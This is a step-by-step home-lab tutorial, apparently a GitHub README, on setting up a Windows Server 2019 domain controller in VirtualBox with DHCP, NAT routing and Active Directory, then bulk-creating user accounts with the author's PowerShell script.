# How to Setup a Basic Home Lab Running Active Directory with Oracle VirtualBox and Automating User Creation via Powershell!

## Project Summary

This domain controller with will be built with appropriate server tools such as DHCP, Routing and Remote Access, and Active Directory Domain Services to create an automation process for provisioning user accounts (via PowerShell script) across a single domain with an internal client machine – this will streamline a quicker and robust automation to save time and human error.

![Domain Controller Setup](https://imgur.com/h2UmNkx.png)

### Components

- **Oralce VirtualBox**
- **Windows Server 2019 ISO**
- **Client Machine (Windows 10 ISO)**
- **Interal NIC for DC and Client Machine**
- **External NIC (Internet)**
- **Remote Access Server/Network Address Translation (RAS/NAT)**
- **Dynamic Host Configuration Protol (DHCP)**
- **Powershell**
- **Server tools: DHCP, Routing and Remote Access, and Active Directory Domain Services**

**DISCLAIMER:** YOU WILL WANT TO FIRST SETUP YOUR WINDOWS VM WITH AN ISO IMAGE THROUGH MICROSOFT WEBSITE THEN CREATE THE VM THROUGH ORACLE VIRTUAL BOX!!!

**NOTE:** YOU WILL NEED WINDOWS 10 **ENTERPRISE** FOR THE CLIENT MACHINE IN ORDER TO PERFROM THIS PROJECT!

## How To Setup
1.) **Setting up network in MS 2019**

![Microsoft Windows Server 2019 ISO](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2019)

![Microsoft Windows 10 Enterprise ISO](https://www.microsoft.com/en-us/software-download/windows10)

**Once you have successfully created and spun up your MS 2019 server, check out the network settings by going to "Control Panel>Network and Internet>Network Connections"**

**Figure out which network interface is your internal and external, by doing that you can open up each interface's properties by inspecting the IP address (10.X.X.X is your home network A.K.A your external network) so that leaves us with "Ethernet 2" as our internal and I'm renaming these for my sake.**

![](https://imgur.com/Tahq0Wr.png)

**Here are my renamed interfaces.**

![](https://imgur.com/2kAQcqC.png)

**Then, you will want to also rename the host of MS 2019 to "DC" by navigating to "Settings>About>Rename your PC" then restart the machine.**

![](https://imgur.com/oUAjyf2.png)

**Once the machine is back up, you will want to configure the internal network interface by going to "Control Panel>Network and Internet>Network Connections" then click on the internal interface and click on "properties" and under "IPV4 (TCP/IPv4) properties, enter the following assigned IP as listed in the image below.**

![](https://imgur.com/3hsn3S5.png)

**After that is done, you will want to go to "Server Manager" then click on "Add roles and features" as listed below.**

![](https://imgur.com/3RGB6r8.png)

**Once you get past that, you will click "Next" THREE times until you reach "Server Roles", from there you will click the check box on each role you will need to add as accordingly.**

![](https://imgur.com/gfhKmDI.png)

**Then click "Next" TWICE, then once at the "Confirmation" page click install.**

![](https://imgur.com/z0IYoDA.png)

**After the installation is completed you will need to click on the link to promote the server to a DC.**

![](https://imgur.com/rtvkNKO.png)

**Select "Add a new forest" and select a domain name as followed below then click on "Next".**

![](https://imgur.com/VSJoZgQ.png)

**Then after that another window will pop up for a password, enter a desired password and leave all defaults checked and then proceed to all the "Next" options until "Install" button can be executed.**

**The machine will automatically restart so once back up login and create a dedicated admin account by click "Start>Active Directory Users and Computers".**

![](https://imgur.com/Dcya7rl.png)

**Then go to your domain and right click to "Organizational Unit".**

![](https://imgur.com/mg9zfoW.png)

**You will create a admin group and uncheck the box selected and click "Ok".**

![](https://imgur.com/8DRFwkD.png)

**Then inside of the admin folder create a user accordingly, once finished you will modify that user and add the object name of "domain admins" then click on "Check Names" to resolve to the desired group and click "Apply" and "Ok".**

![](https://imgur.com/f94lVgB.png)

**Afterwards, logout and login as the admin account to verify. Once logged in then install RAS/NAT by going to "Server Manager" then go to "Add Roles and Features", from there you will go to "Server Roles" and make sure that "Remote Access" is added then click "Next" and select "Direct Access and VPN (RAS) and Routing" then proceed to "Install".**

![](https://imgur.com/7Lmw0Wr.png)

**Once the installation is done, go to "Tools>Routing and Remote Access" then configure and enable the DC.**

![](https://imgur.com/Zh0Ekp0.png)

**You will click "Next" until you come across the configuration section and make sure to select "Network address translation".**

![](https://imgur.com/l2Bxvkw.png)

**Then choose the external interface then click "Next" and "Finish".**

![](https://imgur.com/wxNpyvg.png)

**After that you will need to go back to "Add Roles and Features" and under "Server Roles" you will select "DHCP Server" then "Install".**

![](https://imgur.com/YVvZycn.png)

**Once installed we need to define the scope, navigate to "Tools>DHCP" then right click "IPv4" and click on "New Scope".**

![](https://imgur.com/Qwmf7M7.png)

**Then enter the IP range as instructed below based off the topology page.**

![](https://imgur.com/LCXZCl5.png)

**Then enter the IP config below and ensure that you configure the proper subnet since /24 will represent a practical balance of providing 254 usable IP addresses, this makes sense because its a home lab and aligns with medium netowrks such as offices or home neworks.**

![](https://imgur.com/3y1Wjwp.png)

**Then proceed to "Lease Duration" and configure it to desired value (this setting is used to allow a user to have the assigned IP from DHCP for an alotted time before it reassigns a new IP under a specific time) then click "Next"**

![](https://imgur.com/P3Pf6vz.png)

**Make sure "Yes, I want to configure these options now" is marked then procced to "Next"**

![](https://imgur.com/WAJRHiJ.png)

**Then you will enter the following IP for the default gateway then click "Next"**

![](https://imgur.com/4IQl7Yt.png)

**Then on "Domain Name and DNS Servers" click "Next" twice until out of wizard.**

**Right click the DHCP server and "Authorize" then "Refresh" by right clicking DHCP server again.**

![](https://imgur.com/JUqhIVl.png)

**From there you can now see all the settings that were configured from the wizard so now we are done with the DC for now.**

2.) **Creating Users With Automation of Powershell**

**NOTE:** YOU WILL NEED THE SCRIPT AND USER TEXT DOCUMENT ![Powershell Script and User Text Document](https://github.com/JustinSalvi/Active-Directory/raw/refs/heads/main/Active-Directory-main.zip)

**OR**

**You can go to IE and enter the link: https://github.com/JustinSalvi/Active-Directory/raw/refs/heads/main/Active-Directory-main.zip then save the folder to your desktop.**

**MAKE SURE YOU ADD YOUR FIRST AND LAST NAME IN THE TXT FILE THEN SAVE IT BEFORE RUNNING THE SCRIPT!**

![](https://imgur.com/G3ad1YJ.png)

**In the DC machine go to "Start>Windows Powershell ISE" as Administrator and select "Yes".**

![](https://imgur.com/XV8fTAr.png)

**Then once running, go to the "Open" folder and go to "Desktop" and you will see the file that you have saved earlier on your desktop.**

![](https://imgur.com/g3nhj1v.png)

![](https://imgur.com/5kecp56.png)

**Before we run the script we have to enable execution of all scripts in this server, so by doing so type the following command in PS.**

![](https://imgur.com/rnXUizU.png)

**Click on "Yes to All".**

**To run the script we first have to be in the correct directory as followed below.**

![](https://imgur.com/TG7t3Xd.png)

**Type "ls" to view what's in the directory to confirm that the script is there.**

![](https://imgur.com/LA2jjXQ.png)

**Then run the green script button and click "Run once"**

![](https://imgur.com/AYgn1Y3.png)

**NOTE:** This will take some time but if you want to confirm if the users are being created, go to "Active Directory and Users and Computers"

**Once the creation is done and successful you can spin up a Windows 10 Enterprise machine but while creating the VM in Oraclebox you set the network to "Internal Network" so that the client machine can talk to the Domain Controller.**

![](https://imgur.com/g3VQl5w.png)

**To login use one of the users that you have created earlier from the script or simply use your own username that you put in the text file before execution.**

### Conclusion

**So we created a small home office network consisting of a Microsoft Server 2019 acting as a domain controller and a client machine that is a part of the internal network, we also streamlined a user creation automation process through powershell to prevent any human errors and ensure a quick and easy process!**
